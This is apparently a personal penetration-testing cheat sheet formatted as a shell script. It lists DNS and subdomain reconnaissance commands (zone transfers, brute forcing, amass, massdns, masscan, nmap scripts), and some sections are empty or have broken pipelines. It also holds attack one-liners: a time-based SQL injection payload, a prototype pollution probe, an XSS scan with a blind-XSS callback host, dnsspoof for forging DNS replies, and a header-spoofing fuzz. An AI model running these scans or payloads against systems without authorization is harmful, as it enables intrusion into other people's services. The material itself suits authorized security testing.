#!/bin/sh
##-===========================================================-##
##    [+] Xe1phix-[Recon]-[v12.4.52].sh
##-===========================================================-##





||                     DNS Record types ||              Methods           ||                  Description                          ||
||:-----:||:---------------------------:||:------------------------------:||:---------------------------------------------------------------------:||:-----------------------------------------------------------------------:||
||     A ||              Address Record ||  Returns a 32-bit IPv4 address || most commonly used to map hostnames to an IP address of the host      ||  but it is also used for DNSBLs, storing subnet masks in RFC 1101, etc  ||
|| CNAME ||       Canonical Name Record ||   Alias of one name to another || the DNS lookup will continue by retrying the lookup with the new name ||
||  AAAA ||         IPv6 Address Record || Returns a 128-bit IPv6 address || most commonly used to map hostnames to an IP address of the host      ||
||    MX ||        Mail Exchange Record || Maps a domain name to a list of message transfer agents for that domain|
||    NS ||          Name Server Record || Delegates a DNS zone to use the given authoritative name servers || 
||   SOA ||    zone of Authority Record || Specifies authoritative information about a DNS zone || including the primary name server, the email of the domain administrator, the domain serial number, and several timers relating to refreshing the zone.|
||   SPF ||     Sender Policy Framework || email-validation system designed to detect email spoofing || by providing a mechanism to allow receiving mail exchangers to check that incoming mail from a domain comes from a host authorized by that domain's administrators.|
||   TXT ||                 Text Record || arbitrary human-readable text in a DNS record ||
||:-----:||:---------------------------:||:--------------------------------------------------------------------------------:||:
||   PTR ||              Pointer Record || Pointer to a canonical name    || Unlike a CNAME, DNS processing stops and just the name is returned || 
||       ||                             || The most common use is for implementing reverse DNS lookups
||:-----:||:---------------------------:||:--------------------------------------------------------------------------------:||:
||   SRV ||             Service Locator || Generalized service location record || used for newer protocols instead of creating protocol-specific records such as MX ||
||  NSEC ||          Next Secure Record || Part of DNSSEC—used to prove a name does not exist. Uses the same format as the (obsolete) NXT record ||
||:-----:||:---------------------------:||:--------------------------------------------------------------------------------:||:
||  AXFR || Authoritative Zone Transfer || Transfer entire zone file from the master name server to secondary name servers
||       ||                             || A user or server will perform a specific zone transfer request from a name server.‖ 
||       ||                             || If the name server allows zone transfers to occur, all the DNS names and IP addresses 
||       ||                             || hosted by the name server will be returned in human-readable ASCII text ||
||:-----:||:---------------------------:||:--------------------------------------------------------------------------------:||
||  IXFR ||   Incremental Zone Transfer || Transfer entire zone file from the master name server to secondary name servers  ||
||:-----:||:---------------------------:||:--------------------------------------------------------------------------------:||
###     ####         ####              ####                         ####
||:------------------:||:-------------------------------------------:||
||       DNS Wildcard || Check if Nameserver enableS Wildcard Query  ||  (or DNS Faked)
||  Domain Bruteforce || Bruteforce Subdomains Using Wordlists       ||
||:------------------:||:-------------------------------------------:||
||\__________________/||\___________________________________________####__________________________________________/||
||  DNS Zone Transfer || replicate DNS data across a number of DNS servers, or to back up DNS files.               ||
||                    || A user or server will perform a specific zone transfer request from a name server         |‖ 
||                    || If the name server allows zone transfers to occur, all the DNS names and IP addresses     ||
||                    || hosted by the= name server will be returned in human-readable ASCII text                   ||
||\__________________/||\_________________________________________________________________________________________/||
###                  \||/                         ####
||:------------------:||:-------------------------:||
|| Reverse Bruteforce ||  Reverse IP For Domain    ||
||     SRV Bruteforce ||  Bruteforce SRV Records   ||
||    gTLD Bruteforce ||  Bruteforce gTLD Records  ||
||     TLD Bruteforce ||  Bruteforce TLD Records   ||
||:------------------:||:-------------------------:||
###                  ####                         #### 



##-=========================================-##
##    [+] Automatic Zone Transfer (AXFR)
##-=========================================-##


##-=========================================================-##
##    [+] Incremental Zone Transfers (IXFR)
##-=========================================================-##
## --------------------------------------------------------- ##
##   [?] Incremental zone transfer is a list of changes
## --------------------------------------------------------- ##


ping $Domain
dig -x $Domain
dig -6 AAAA $Domain
nslookup -debug $Domain
nslookup -query=ns $Domain
nslookup -querytype=mx $Domain
nslookup recursive $Domain
nslookup server $Server set type=any ls -d $Domain

                
host -l $Domain
whois $Domain


host -t ns $Domain



##-=================================-##
##   [+] Full Zone Transfer (AXFR)
##-=================================-##


dig $Domain -t axfr
host -l $Domain ns1.$Domain
dnsrecon -d $Domain -t axfr
dnsrecon -d $Domain -t axfr @ns1.$Domain
dnsenum $Domain
dnsrecon -d $Domain -t axfr @ns1.$Domain

nmap --script=dns-zone-transfer $Domain


## ----------------------------------------------------------------------------------------- ##
	nslookup server $Server set type=any ls -d $Domain		## DNS zone transfer
## ----------------------------------------------------------------------------------------- ##


##-==========================================-##
##   [+] Incremental Zone Transfer (IXFR)
##-==========================================-##



##-===========================================-##
##  [+] Metasploit - Reverse DNS (PTR) Scan
##-===========================================-##
msfconsole
> use auxiliary/gather/dns_reverse_lookup
> set RANGE 192.168.1.0/24
> run

> use auxiliary/gather/enum_dns
> use auxiliary/gather/dns



##-=======================-##
##  [+] Query MX records
##-=======================-##
dig -t MX @DNSServer mail.$Domain.com
host -t MX $Domain
nslookup -querytype=mx $Domain
systemd-resolve -t MX $Domain




##-=============================================-##
##  [+] Sender Policy Framework (SPF) Lookups
##-=============================================-##








## -------------------------------------------------------------------------------------- ##
##   [?] SOA - start of authority - Defines the authoritative information about a zone
## -------------------------------------------------------------------------------------- ##
nslookup -querytype=SOA $Domain
dig -t soa $Domain
host -t soa $Domain
## host -C $Domain



dig $Domain ANY +noall +answer
nslookup -query=any $Domain
nslookup -debug $Domain


##-==================================-##
##  [+] DNS - Brute Force Attacks
##-==================================-##

##-==================================================-##
##  [+] DNSRecon - 
##-==================================================-##
dnsrecon -t brt,std,axfr -D /pentest/enumeration/dns/dnsrecon/namelist.txt -d $Domain


##-==================================================-##
##  [+] DNSRecon - host and subdomain brute force
##-==================================================-##
dnsrecon -d $Domain -D subdomains-top1mil-20000.txt -t brt --threads 10 -a


##-=======================================-##
##  [+] NMap - NSE Script - DNS Brute
##-=======================================-##
nmap -sn -Pn --script dns-brute $IP


##-============================================================================-##
##  [+] Brutesubs - Run multiple subdomain bruteforcing tools (in parallel)
##-============================================================================-##


##-===========================================-##
##  [+] DNS Brute - Subdomain Enumeration
##-===========================================-##
for sub in $(cat subdomains.txt);do host $sub.$Domain.com|grep "has.address";done
dnsrecon -d $Domain -D wordlist.txt -t std --xml output.xml


## ------------------------------------------ ##
##   [?] Show IP addresses of subdomains
## ------------------------------------------ ##
for x in $(cat /usr/share/dnsenum/dns.txt); do
     host $x.$Domain | grep 'has address' | cut -d ' ' -f1,4 >> tmp
done



##-====================================-##
##   [+] Ping Sweep Enumeration 



post/multi/gather/ping_sweep




Retrieve the MX record of $Domain

systemd-resolve -t MX 



Retrieve a TLS key ("=tcp" and ":443" could be skipped)

systemd-resolve --tlsa=tcp $Domain:443


##-==========================-##
##   [+] DNS Zone Walking:
##-==========================-##
dnsrecon -d $Domain -t zonewalk

fierce -dns $Domain

## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] dnswalk is a DNS debugger.
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dnswalk $Domain
dnswalk -r -d $Domain

nmap --script firewalk.nse


## --------------------------------------------------------------------- ##
##    [?] Firewalk - active reconnaissance network security tool 
## --------------------------------------------------------------------- ##
firewalk -S8079-8081  -i eth0 -n -pTCP 192.168.1.1 192.168.0.1





##-==========================================================-##
## ---------------------------------------------------------- ##
##   [+] Autonomous System Number(ASN) + Netblocks Recon
## ---------------------------------------------------------- ##
##-==========================================================-##


##-==================================================-##
##   [+] NMap - Find netblocks that belong to an ASN
##-==================================================-##
nmap --script targets-asn --script-args targets-asn.asn=$ASN


##-===================================================-##
##   [+] NMap - Find Information about IP address
##-===================================================-##
nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24


nmap --script ip-geolocation-geoplugin.nse $IP
nmap --script ip-geolocation-ipinfodb.nse $IP
nmap --script ip-geolocation-map-bing.nse $IP
nmap --script ip-geolocation-map-google.nse $IP
nmap --script ip-geolocation-map-kml.nse $IP
nmap --script ip-geolocation-maxmind.nse $IP




##-========================================-##
##   [+] Find ASN for a given IP address
##-========================================-##
curl -s http://ip-api.com/json/$IP | jq -r .as




http://asnlookup.com/api



##-===============================================-##
##   [+] RapidDNS API - Subdomain Enumeration:
##-===============================================-##
curl -s "https://rapiddns.io/subdomain/$TARGET?full=1&down=1#exportData()"
 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"
 | sort -u | grep "$TARGET" | cut -d\/ -f3



##-===============================================-##
##   [+] Censys API - OSINT - Subdomain Finder:
##-===============================================-##
python $PLUGINS_DIR/censys-subdomain-finder/
censys_subdomain_finder.py --censys-api-id $CENSYS_APP_ID --censys-api-secret $CENSYS_API_SECRET $TARGET
 | egrep "\-" | awk '{print $2}'
 | egrep -v "Searching|Found" > $DIR/domains-$TARGET-censys.txt




##-=================================================-##
##   [+] Crt.sh API - OSINT - Domain Enumeration:
##-=================================================-##
## -------------------------------------------------------------------- ##
##   [?] Finding Subdomains - Abusing Certificate Transparency Logs
## -------------------------------------------------------------------- ##
curl -s https://crt.sh/?q=%25.$TARGET > $DIR/domains-$TARGET-presorted.txt
cat $DIR/domains-$TARGET-presorted.txt | grep $TARGET | grep TD
 | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/BR/\n/g'
 | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | grep -v "*"
 | sort -u > $DIR/domains-$TARGET-crt.txt



##-=================================================-##
##   [+] :
##-=================================================-##
## -------------------------------------------------------------------- ##
##   [?] 
## -------------------------------------------------------------------- ##



##-=================================================================-##
##   [+] Lookup autonomous systems of all outgoing http/s traffic
##-=================================================================-##
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3


##-======================================-##
##   [+] hackertarget - ASN Lookup API
##-======================================-##
curl https://api.hackertarget.com/aslookup/?q=$1 > IP_LIST.txt


##-==============================================-##
##   [+] spyse - Get Autonomous System details
##-==============================================-##
echo "AS15169" | spysecli as


##-====================================-##
##   [+] Block all FaceBook traffic
##-====================================-##
ASN=32934; for s in $(whois -H -h riswhois.ripe.net -- -F -K -i $ASN | grep -v "^$" | grep -v "^%" | awk '{ print $2 }' ); do echo " blocking $s"; sudo iptables -A INPUT -s $s -j REJECT &> /dev/null || sudo ip6tables -A INPUT -s $s -j REJECT; done






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] AMass - 
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##

## ----------------------------------------------------------------------- ##
##   [?] AMass - Attack Surface Mapping and Asset Discovery tool
## ----------------------------------------------------------------------- ##


##-============================-##
##   [+] 
##-============================-##
amass enum -list


##-======================================-##
##   [+] Enumerate Domain + Source + IP
##-======================================-##
amass enum -src -ip -d $URL


##-============================-##
##   [+]
##-============================-##
amass enum -src -brute -d $Domain -o $File


##-============================-##
##   [+]
##-============================-##
amass intel -whois -ip -src -d $Domain -o $File


##-========================================-##
##   [+] Passively Search For Subdomains:
##-========================================-##
amass enum -passive -d $Domain -src


##-=====================================-##
##   [+] Active Subdomain Bruteforcing:
##-=====================================-##
amass enum -active -d $Domain -brute -w $File -src -ip -dir $Dir -config $File -o $File


##-=========================-##
##   [+] DNS Enumeration:
##-=========================-##
amass enum -v -src -ip -brute -d $Domain



amass enum -d $Domain



amass intel -whois -d $Domain
amass intel -active 172.21.0.0-64 -p 80,443,8080,8443
amass intel -ipv4 -whois -d $Domain
amass intel -ipv6 -whois -d $Domain


##-========================================-##
##   [+] Discover Targets for Enumeration:
##-========================================-##
amass intel -d $Domain


##-==============================================-##
##   [+] Find root domains related to a domain:
##-==============================================-##
amass intel -d $Domain -whois


##-===============================================-##
##   [+] Find ASNs belonging to an organisation:
##-===============================================-##
amass intel -org '$OrgName'


##-===========================================-##
##   [+] AMass - Use Active Recon Methods:
##-===========================================-##
amass intel -active -addr
amass intel -active -addr 192.168.0.1-254

##-=======================================================================-##
##   [+] Find root domains belonging to a given Autonomous System Number:
##-=======================================================================-##
amass intel -active -asn $ASN -ip -src


##-===========================================-##
##   [+] AMass - :
##-===========================================-##
amass intel -log amass.log -whois



amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500''



##-===========================================-##
##   [+] AMass - :
##-===========================================-##
amass -src -ip -active -exclude crtsh -d $Domain
# amass -src -ip -active -brute --min-for-recursive 3 -exclude crtsh -w $Wordlist -d $Domain


##-===========================================-##
##   [+] AMass - :
##-===========================================-##
amass enum -src -ip -d $Domain


##-==============================================-##
##  [+] AMass - Gather Reverse DNS Subdomains:
##-==============================================-##
amass intel -whois -d $Domain > $Dir/domains/domains-$Domain-reverse-whois.txt



##-========================================-##
##  [+] AMass - 
##-========================================-##
amass enum -config /$Dir/config.ini -passive -o amass_subs.txt -d $Domain

amass enum  --passive -d $target -config $Dir/amass-config.ini -o $Dir/amass.txt


##-=======================================-##
##   [+] Double checking for subdomains
##   [+] with amass and certspotter.
##-=======================================-##
amass enum -d $Domain | tee -a $Dir/final1.txt


##-===============================================-##
##   [+] Typical parameters for DNS enumeration:
##-===============================================-##
#amass enum -v -src -ip -brute -min-for-recursive 2 -d $Domain



##-===============================================-##
##  [+] AMass - 
##-===============================================-##
amass -src -ip -active -exclude crtsh -d $Domain
## amass -src -ip -active -brute --min-for-recursive 3 -exclude crtsh -w $WORDLIST -d $Domain




## ----------------------------------------------------- ##
##   [?] AMass Viz - Visualize Enumeration Results:
## ----------------------------------------------------- ##


##-===================================================-##
##   [+] Importing OWASP Amass Results into Maltego
##-===================================================-##


##-======================================================-##
##   [+] Visualize Enumeration Results Using Maltego:
##-======================================================-##
## -------------------------------------------------------------------- ##
##   [?] Convert the Amass data into a Maltego graph table CSV file:
## -------------------------------------------------------------------- ##
amass viz -maltego


##-=======================================================================-##
##   [+] AMass - Generate a D3.js visualization based on database data
##-=======================================================================-##
amass viz -d3 -dir $Dir


##-==========================================================-##
##   [+] AMass - Generate Dot file based on database data
##-==========================================================-##
amass viz -dot -dir $Dir


##-=======================================================================================-##
##   [+] AMass - Generate Gephi Graph Exchange XML Format (GEXF) based on database data
##-=======================================================================================-##
amass viz -gexf -dir $Dir


##-======================================================================-##
##   [+] AMass - Generate Graphistry JSON file based on database data
##-======================================================================-##
amass viz -graphistry -dir $Dir



##-==============================================================-##
##   [+] AMass - Show difference between last 2 enumerations:
##-==============================================================-##
amass track -dir $Dir -d $Domain -last 2


##-=================================================================-##
##   [+] AMass - Show difference between a certain point In time:
##-=================================================================-##
amass track -dir $Dir -d $Domain -since $Time
amass track -dir $Dir -d $Domain -since 01/02 15:04:05 2006 MST




##-=================================================================-##
##   [+] AMass - List all performed enumerations In the database:
##-=================================================================-##
amass db -dir $Dir -list



##-===============================================================-##
##   [+] AMass - Show results for specified enumeration index:
##-===============================================================-##
amass db -dir $Dir -d $Domain -enum $Index -show


##-========================================================-##
##   [+] AMass - list all found subdomains of a domain:
##-========================================================-##
amass db -dir $Dir -d $Domain -enum $Index -names


##-===================================================-##
##   [+] AMass - Show summary of found subdomains:
##-===================================================-##
amass db -dir $Dir -d $Domain -enum $Index -summary




##-================================================-##
##   [+] AMass - Intel - Active - ASN Recon Scan:
##-================================================-##
amass intel -active -asn $ASN -ip


##-================================================================-##
##   [+] AMass - Enum - DNS Brute Force - Subdomain Enumeration:
##-================================================================-##
#amass enum -v -src -ip -brute -min-for-recursive 2 -d $Domain


##-============================================-##
##   [+] AMass - Intel - Reverse Whois Scan:
##-============================================-##
amass intel -whois -d $TARGET > $DIR/domains-$TARGET-reverse-whois.txt



##-=================================================================-##
##   [+] AMass - List all performed enumerations in the database:
##-=================================================================-##
amass db -dir $Dir -list



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] DNS Subdomain - Enumeration + Bruteforcing
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-==================================================-##
##   [+] AMass - DNS Subdomain - Enumeration Scan:
##-==================================================-##
amass enum -ip -o $DIR/domains-$TARGET-amass.txt -rf /usr/share/sniper/plugins/massdns/lists/resolvers.txt -d $TARGET



##-==================================================================-##
##   [+] Sn1per - Sublist3r Plugin - Subdomain - Enumeration Scan:
##-==================================================================-##
python /usr/share/sniper/plugins/Sublist3r/
sublist3r.py -d $TARGET -vvv -o $DIR/domains-$TARGET.txt


##-=======================================================-##
##   [+] SubFinder - DNS Subdomain - Enumeration Scan:
##-=======================================================-##
subfinder -o $DIR/domains-$TARGET-subfinder.txt -b -d $TARGET -w $DOMAINS_DEFAULT -t 100


##-==================================================================-##
##   [+] DNScan - DNS Brute Force - Subdomain Enumeration Scan:
##-==================================================================-##
python3 $PLUGINS_DIR/dnscan/
dnscan.py -d $TARGET -w $DOMAINS_QUICK -o $DIR/domain-dnscan-$TARGET.txt -i $DIR/Domain-IPs-$TARGET.txt






##-=================================================-##
##   [+] :
##-=================================================-##
## -------------------------------------------------------------------- ##
##   [?] 
## -------------------------------------------------------------------- ##


##-=================================================-##
##   [+] NMap - :
##-=================================================-##



##-=================================================-##
##   [+] NMap - :
##-=================================================-##



##-=================================================-##
##   [+] NMap - :
##-=================================================-##


##-=================================================-##
##   [+] NMap - :
##-=================================================-##
## -------------------------------------------------------------------- ##
##   [?] 
## -------------------------------------------------------------------- ##


dns-srv-enum.nse
dns-recursion.nse
dns-service-discovery.nse
dns-client-subnet-scan.nse
dns-fuzz.nse
dns-check-zone.nse


##-====================================================-##
##   [+] NMap - DNS Cache Snooping Emumeration Scan:
##-====================================================-##

nmap -sU -p 53 --script dns-cache-snoop.nse
nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains=$Domain' $IP




##-========================================-##
##   [+] DNS Cache Snooping Emumeration:
##-========================================-##
## -------------------------------------------------------------------- ##
##   [?] 
## -------------------------------------------------------------------- ##

dnsrecon --type snoop -n $Server -D $Dict		## Cache Snooping











sniper -t $Domain -o -re



bing-ip2hosts -p $IP
automater -s robtex $IP
dnsmap -w $File.txt $Domain
dnstracer $Domain
sublist3r -d $Domain
subfinder -d $Domain
subjack $Domain
dnsenum $Domain
dnsrecon -d $Domain -t axfr
dnsrecon --type snoop -n $Server -D $Dict		## Cache Snooping
fierce -dns $Domain
dnswalk -r -d $Domain
dnstracer -r 3 -v $Domain

dnsdict6 -4 -d -t 16 -e -x $Domain

massdns -r $Dir/$Resolvers.txt -t A -q -o S $File.txt
dnscan --domain $Domain --wordlist $File -o $Dir/dnscan-$Domain.txt




## ------------------------------------------------------------------------------------------ ##
##   [?] dnsspoof - forges replies to arbitrary DNS address & pointer queries on LAN
## ------------------------------------------------------------------------------------------ ##

dnsspoof -i eth0 -f $HostsFile 




# 1st resolve subdomains on valid websites
##   [?] https://github.com/projectdiscovery/httpx

cat subdomains.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.txt

##\_____________________/##
##   [?] Clean output:
## --------------------- ##
cat webs_info.txt | cut -d ' ' -f1 | grep ".domain.com" | sort -u > websites.txt





##-========================-##
##     [+] httpx - Extract and Probe all the ips associated with same host
##-========================-##
httpx -l /$Dir/$File.txt -pa -o $File.txt


##-================================-##
##    [+] Nuclei - Scan all ports
##-================================-##
httpx -l ips.txt -ports - -o IPsPorts.txt

nuclei -l IPsPorts.txt -t nuclei-templates


##-========================================================================-##
##    [+] httpx - Extract Sensitive Informations on /auth.json Endpoint
##-========================================================================-##
subfinder -d $Domain | httpx -path "/auth.json" -title -status-code -content-length -t 80 -p 80,443,8080,8443,9000,9001,9002,9003



##-=================================================-##
##    [+] httpx - Time-based SQLi in sitemap.xml 
##-=================================================-##
cat urls | httpx -silent -path 'sitemap.xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10'


##-============================-##
##   [+] Prototype Pollution
##-============================-##
subfinder -d HOST -all -silent ❘ httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\\\\\\\\/?_proto_[testparam]=exploit\\\\\\\\//' FILE.txt | page- fetch -j 'window.testparam == "exploit"? "[VULNERABLE]": "[NOT VULNERABLE]"' | sed "s/(//g" sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"


##-==============================-##
##   [+] Sitemap SQL Injection
##-==============================-##
cat urls.txt | httpx -silent -path 'sitemap.xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10'


##-==============================-##
##   [+] Httpx - 
##-==============================-##
httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne



cat "$SUBS"/hosts | sed 's/https\?:\/\///' | gau > "$ARCHIVE"/getallurls.txt
cat "$ARCHIVE"/getallurls.txt  | sort -u | unfurl --unique keys > "$ARCHIVE"/paramlist.txt
cat "$ARCHIVE"/getallurls.txt  | sort -u | grep -P "\w+\.js(\?|$)" | httpx -silent -status-code -mc 200 | awk '{print $1}' | sort -u > "$ARCHIVE"/jsurls.txt
cat "$ARCHIVE"/getallurls.txt  | sort -u | grep -P "\w+\.php(\?|$) | httpx -silent -status-code -mc 200 | awk '{print $1}' | sort -u " > "$ARCHIVE"/phpurls.txt
cat "$ARCHIVE"/getallurls.txt  | sort -u | grep -P "\w+\.aspx(\?|$) | httpx -silent -status-code -mc 200 | awk '{print $1}' | sort -u " > "$ARCHIVE"/aspxurls.txt
cat "$ARCHIVE"/getallurls.txt  | sort -u | grep -P "\w+\.jsp(\?|$) | httpx -silent -status-code -mc 200 | awk '{print $1}' | sort -u " > "$ARCHIVE"/jspurls.txt


##-=======================================-##
##   [+] DNSProbe - 
##-=======================================-##
cat "$SUBS"/subdomains | dnsprobe -r CNAME -o "$SUBS"/subdomains_cname.txt


##-=======================================-##
##   [+] DNSProbe - 
##-=======================================-##
cat "$SUBS"/subdomains | dnsprobe -silent -f ip | sort -u | tee "$IPS"/"$domain"-ips.txt
python3 $HOME/ReconPi/scripts/clean_ips.py "$IPS"/"$domain"-ips.txt "$IPS"/"$domain"-origin-ips.txt


##-========================================-##
##   [+] waybackurls - 
##-========================================-##
waybackurls $Domain | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt


##-======================================-##
##   [+] assetfinder - 
##-======================================-##
assetfinder $Domain | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'


for js in `cat "$ARCHIVE"/jsurls.txt`;
	do
		python3 "$HOME"/tools/LinkFinder/linkfinder.py -i $js -o cli | anew "$ARCHIVE"/endpoints.txt;
	done





##-================================================================-##
##   [+] HTTPry - Listen on eth0 and save output to binary PCAP:
##-================================================================-##
httpry eth0 -b $Dir/$File.pcap



##-==============================================-##
##   [+] HTTPry - Filter output by HTTP verbs:
##-==============================================-##
httpry -m get|post|head|options|delete|trace|connect|patch


##-================================================================-##
##   [+] HTTPry - Read from input capture file and filter by IP:
##-================================================================-##
httpry -r $Dir/$File.log 'host $IP'
httpry -r $Dir/$File.log 'host 192.168.0.25'
'tcp dst port 80 and src host 192.168.1.1'

##-=========================================-##
##   [+] HTTPry - Run as daemon process:
##-=========================================-##
httpry -d -o $Dir/$File.log







##   [?] https://github.com/projectdiscovery/dnsx

dnsx -retry 3 -a -aaaa -cname -ns -ptr -mx -soa -resp -silent -l subdomains.txt

 
dnsviz





## ------------------------------------------------------------------------------------------ ##
    dnstwist --registered $Domain           ## Show only registered domain names
## ------------------------------------------------------------------------------------------ ##
    dnstwist --dictionary $File $Domain     ## Generate more domains using dictionary FILE
## ------------------------------------------------------------------------------------------ ##
    dnstwist --geoip $Domain                ## Lookup for GeoIP location
## ------------------------------------------------------------------------------------------ ##
    dnstwist --mxcheck $Domain              ## Check if MX can be used to intercept emails
## ------------------------------------------------------------------------------------------ ##
    dnstwist --whois $Domain                ## Lookup WHOIS database for creation date
## ------------------------------------------------------------------------------------------ ##
    dnstwist --tld $File $Domain            ## Generate more domains by swapping TLD from FILE
## ------------------------------------------------------------------------------------------ ##
    dnstwist --nameservers $DNS $Domain     ## DNS servers to query
## ------------------------------------------------------------------------------------------ ##
    dnstwist --all $Domain                  ## Show all DNS records
## ------------------------------------------------------------------------------------------ ##
    dnstwist --banners $Domain              ## Determine HTTP and SMTP service banners
## ------------------------------------------------------------------------------------------ ##





LinEnum.sh -s -k $Keyword -r $ReportName -e /$Dir/ -t 


httprint -h -s $Domain signatures.txt -P0



## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] enumerate DNS information of a domain and to discover non-contiguous ip blocks.
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dnsenum --noreverse -o $File.xml $Domain

## ------------------------------------------- ##
##    [?] dnswalk - DNS Database Debugger
## ------------------------------------------- ##
dnswalk $Domain


dnswalk -r -d $Domain

									## ----------------------------------------------------------- ##
dnswalk -r -d $* $Domain.		    ## Recursively descend sub-domains of the specified domain.
									## Print debugging and 'status' information to stderr
									## ----------------------------------------------------------- ##

									## ---------------------------------------------------- ##
dnswalk -F $Domain					## perform "fascist" checking
									## ---------------------------------------------------- ##
									##  [?] When checking an A record,
									##      compare the PTR name for each IP address
									##      with the forward name and report mismatches.
									## ---------------------------------------------------- ##


## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] 
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dnsmap $Domain -w /usr/share/wordlists/dnsmap.txt

## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] DNSMAP-BULK USAGE EXAMPLE
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
echo "$Domain" >> $File.txt
echo "example.org" >> $File.txt
dnsmap-bulk.sh $File.txt



##-==============================================-##
##   [+] HostMap.rb - 
##-==============================================-##
hostmap.rb --only-passive -t $IP



dnsrecon -d $Domain -D /usr/share/wordlists/dnsmap.txt -t std --xml $File.xml
dnsrecon -d $domain -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ag




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] MassDNS - 
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-==============================================-##
##   [+] Run massdns to determine online hosts
##-==============================================-##
massdns -r $RESOLVERS -q -t A -o -S -w $File.out $File-merged.txt
cat $File.out | awk '{print $1}' | sed 's/\.$//' | sort -u > $File-online.txt


massdns -r $Dir/resolvers.txt -t A -q -o S $File.txt
massdns -r /$Dir/massdns/lists/resolvers.txt -t A -q -o S -w $Dir/massdns.out all.txt



##-============================================================================-##
##   [+] Produce a list of IP addresses corresponding to the target's FQDNs:
##-============================================================================-##
cat $File.out | awk '{split($0,a," "); print a[3]}' | sort | uniq >> $File-FQDNs.txt



massdns -r /$Dir/resolvers.txt -t CNAME all.txt -o S > $File.txt



massdns -r /$Dir/resolvers.txt -t AAAA /$Dir/domain.txt

massdns -r /$Dir/resolvers.txt -t NS /$Dir/domain.txt > /$Dir/NS.txt

massdns -r /$Dir/resolvers.txt -t SOA /$Dir/domain.txt -w /$Dir/SOA.txt

massdns -r /$Dir/resolvers.txt -t PTR /$Dir/domain.txt -w /$Dir/PTR.txt

massdns -r /$Dir/resolvers.txt -t CNAME /$Dir/domain.txt -w /$Dir/CNAME.txt

massdns -r /$Dir/resolvers.txt /$Dir/domain.txt -t A -o S -w /$Dir/results.txt



massdns /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -r /usr/share/SecLists/





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] Masscan - 
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


masscan -p 443 -sS -Pn -n --randomize-hosts -v $line > $File.txt


masscan -p-65535 $(dig +short $Domain) --rate 10000



masscan -p1-65535 $(dig +short $1|grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"|head - --max-rate 1000




##-======================================-##
##   [+] Masscan - Offline Benchmark:
##-======================================-##
masscan 0.0.0.0/4 -p80 --rate 100 --offlinemasscan 0.0.0.0/4 -p80 --rate 1000 --offline
masscan 0.0.0.0/4 -p80 --rate 100000 --offline


##-========================================-##
##   [+] Masscan - Network and Port scan
##-========================================-##
masscan 10.10.10.1/24 -p21,80,443


##-======================================-##
##   [+] Masscan - scan a range of IPs
##-======================================-##
masscan 10.10.10.1-50 -p21,80,443


##-===================================-##
##   [+] Masscan - Scanning Subnets
##-===================================-##
masscan -p80 10.10.10.0/24 --rate=1000 -e tun0 --router-ip 10.10.10.1


##-==================================-##
##   [+] Masscan - Banner Grabbing
##-==================================-##
masscan 10.10.10.1 -p 80,443 --banners --source-ip 192.168.1.150


##-================================-##
##   [+] Masscan - Save Results
##-================================-##
